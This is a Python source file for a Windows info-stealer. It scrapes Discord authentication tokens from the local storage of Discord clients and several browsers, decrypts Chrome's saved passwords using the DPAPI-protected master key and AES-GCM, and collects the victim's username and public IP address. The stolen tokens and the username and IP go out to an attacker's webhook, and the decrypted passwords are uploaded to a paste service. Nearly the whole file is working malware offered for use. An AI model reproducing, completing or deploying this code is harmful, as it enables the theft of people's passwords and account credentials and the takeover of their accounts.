import csv
import os
from base64 import b64decode
from json import dumps, loads
from os import environ, getenv, listdir, sep
from re import findall
from shutil import copy2
from sqlite3 import connect

from Crypto.Cipher import AES
from requests import get
from win32 import win32crypt

from modules.config import PING_ME, WEBHOOK_URL
from modules.tools import upload_haste, webhook_request

# FIX LATER TO LAZY TO FIX


def find_tokens(path):
    try:
        path += "\\Local Storage\\leveldb"
        tokens = []

        for file_name in listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue

            for line in [
                x.strip()
                for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                if x.strip()
            ]:
                for regex in (
                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                    r"mfa\.[\w-]{84}",
                ):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    except Exception:
        pass


def logger():
    local = getenv("LOCALAPPDATA")
    roaming = getenv("APPDATA")

    paths = {
        "Discord": f"{roaming}\\Discord",
        "Discord Canary": f"{roaming}\\discordcanary",
        "Discord PTB": f"{roaming}\\discordptb",
        "Google Chrome": f"{local}\\Google\\Chrome\\User Data\\Default",
        "Opera": f"{roaming}\\Opera Software\\Opera Stable",
        "Brave": f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    }

    message = "@everyone" if PING_ME else ""

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f"\n**{platform}**\n```\n"
        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"

        message += "```"

    payload = dumps({"content": message})

    try:
        webhook_request(payload)
    except Exception:
        pass


def steal():
    info = f"**Computer Username** ``{environ['USERNAME']}\n`` **IP Address** ``{get('https://api.ipify.org').text}``"

    try:
        payload = dumps({"content": info})
        webhook_request(payload)
    except Exception:
        pass


def dump_chrome():
    def get_master_key():
        with open(
            environ["USERPROFILE"]
            + sep
            + r"AppData\Local\Google\Chrome\User Data\Local State",
            "r",
            encoding="utf-8",
        ) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Chrome < 80"

    if __name__ == "__main__":
        main_path = f"{environ['USERPROFILE']}/AppData/Local/Packages/Microsoft.Debug_8wekyb3d8bbwe/SystemAppData"
        master_key = get_master_key()
        login_db = (
            environ["USERPROFILE"]
            + r"\AppData\Local\Google\Chrome\User Data\default\Login Data"
        )

        copy2(login_db, f"{main_path}/Loginvault.db")

        conn = connect(f"{main_path}/Loginvault.db")
        cursor = conn.cursor()

        try:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins"
            )
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                print(
                    f"URL: {url} \nUser Name: {username} \nPassword: {decrypted_password}"
                )

                rows = [
                    [
                        f"URL: {url} \nUsername: {username} \nPassword {decrypted_password}\n"
                    ]
                ]

                with open(f"{main_path}/Passwords.txt", "a") as csvfile:
                    csvwriter = csv.writer(csvfile)
                    csvwriter.writerows(rows)

            with open(f"{main_path}/Passwords.txt", "r") as content:
                upload_haste(content)

        except Exception:
            pass

        cursor.close()
        conn.close()
